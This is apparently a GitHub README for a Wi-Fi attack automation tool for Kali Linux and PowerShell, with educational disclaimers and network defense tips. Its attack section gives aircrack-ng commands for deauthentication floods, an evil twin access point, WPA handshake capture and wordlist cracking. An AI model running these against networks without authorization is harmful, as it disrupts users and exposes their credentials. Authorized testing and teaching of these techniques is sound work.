
# 🔥 Wi-Fi Attack Automation Tool (Kali Linux & Windows PowerShell) 🔥

This tool allows you to automate Wi-Fi attacks such as Deauthentication, Evil Twin, and WPA Handshake Capture in **Kali Linux**, and enables Wi-Fi scanning and learning features in **Windows PowerShell**. Perfect for cybersecurity students and professionals!

🚨 **Disclaimer**: This tool is for educational purposes only. Always get permission from network owners before conducting any attacks.

## 📜 Features

### 🔥 **Kali Linux** Version:
- 🕵️ **Network Scanning**: Identify nearby Wi-Fi networks.
- 🚫 **Deauthentication Attack**: Disconnect all clients from a target network.
- 💀 **Evil Twin Attack**: Set up a rogue Wi-Fi access point.
- 📡 **WPA Handshake Capture**: Capture handshakes for offline cracking.
- 🛡️ **Defense Tips**: Learn how to defend your network against attacks.

### 💻 **Windows PowerShell** Version:
- 🕵️ **Wi-Fi Scanning**: View available Wi-Fi networks.
- 🛡️ **Defense Tips**: Learn about Wi-Fi security best practices.
- 📚 **Educational Features**: Gain insights into different types of Wi-Fi attacks and how they work.

## 🎯 How to Use

### Kali Linux Setup

#### 1. Install Dependencies
Ensure you have all necessary tools installed:
```bash
sudo apt-get install aircrack-ng hostapd dnsmasq
```

#### 2. Clone the Repo
```bash
git clone https://github.com/Danyalkhattak/wifi-attack-tool.git
cd wifi-attack-tool
```

#### 3. Install Python Dependencies
```bash
pip install -r requirements.txt
```

#### 4. Run the Tool
```bash
sudo python3 main.py
```

---

### Windows PowerShell Setup

#### 1. Clone the Repo
For Windows PowerShell, you can clone the repository by running:

```powershell
git clone https://github.com/Danyalkhattak/wifi-attack-tool.git
cd wifi-attack-tool
```

#### 2. Install Dependencies
You may need to install some PowerShell modules:

```powershell
Install-Module -Name WiFiProfileManagement
```

You can also use built-in cmdlets for simple network scanning.

#### 3. Run the Tool
```powershell
.\main.ps1
```

---

## 📡 Wi-Fi Scanning

### Kali Linux:
- Run the network scanning module to view nearby Wi-Fi networks:
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

### Windows PowerShell:
- Scan for available Wi-Fi networks:
```powershell
netsh wlan show networks
```

---

## 🚀 Attacks (Kali Linux)

1. **Deauthentication Attack**:
   - Disconnect clients from a target network:
     ```bash
     sudo airmon-ng start wlan0 <channel>
     sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
     ```

2. **Evil Twin Attack**:
   - Create a fake access point:
     ```bash
     sudo hostapd -B /etc/hostapd.conf
     sudo dnsmasq -C /etc/dnsmasq.conf
     ```

3. **WPA Handshake Capture**:
   - Capture a WPA handshake:
     ```bash
     sudo airodump-ng --bssid <BSSID> --channel <channel> -w <output> wlan0mon
     ```

4. **Crack WPA Handshake**:
   - Crack the captured WPA handshake using a wordlist:
     ```bash
     sudo aircrack-ng <handshake.cap> -w /usr/share/wordlists/rockyou.txt
     ```

---

## 🛡️ Defense Measures

### Linux & Windows:
After simulating attacks, learn how to protect your network:
- Use **WPA3** encryption for enhanced security.
- Disable **WPS** (Wi-Fi Protected Setup).
- Enable **802.11w** to protect management frames.
- Set a strong and unique Wi-Fi password.
- Regularly monitor your network for suspicious devices.

---

## 🎯 Windows PowerShell Features

In Windows PowerShell, this tool provides insights and educational examples on common Wi-Fi attacks. It includes:
- **Wi-Fi Scanning**: View the available Wi-Fi networks around you.
- **Attack Simulations**: Learn how attacks like Deauthentication and Evil Twin work (educational only).
- **Defense Tips**: Understand how to protect your network against common attacks.

---

## 🌐 Connect with Me

Follow me on Instagram or support my work by buying me a coffee!

[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/dannyk_739)
[![BuyMeACoffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://www.buymeacoffee.com/DannyK)

---

## 📖 Tutorials

### Scanning for Networks

#### Kali Linux:
1. Start your Wi-Fi adapter in monitoring mode:
   ```bash
   sudo airmon-ng start wlan0
   ```

2. Scan networks in range:
   ```bash
   sudo airodump-ng wlan0mon
   ```

#### Windows PowerShell:
1. Run the following command to view available networks:
   ```powershell
   netsh wlan show networks
   ```

### Defending Against Attacks

1. **WPA3**: Use WPA3 encryption for the strongest security.
2. **MAC Filtering**: Limit which devices can connect to your Wi-Fi based on their MAC address.
3. **Disable WPS**: Turn off WPS in your router settings to prevent brute-force attacks.

---

## 🚀 Roadmap

- Add ARP Spoofing and DNS Poisoning attacks.
- Implement a GUI for both Windows and Linux.
- Add support for advanced password cracking options.

## ⚠️ Disclaimer

This tool is for **ethical hacking** and **educational purposes only**. Do not use it on networks you do not own or have permission to test.
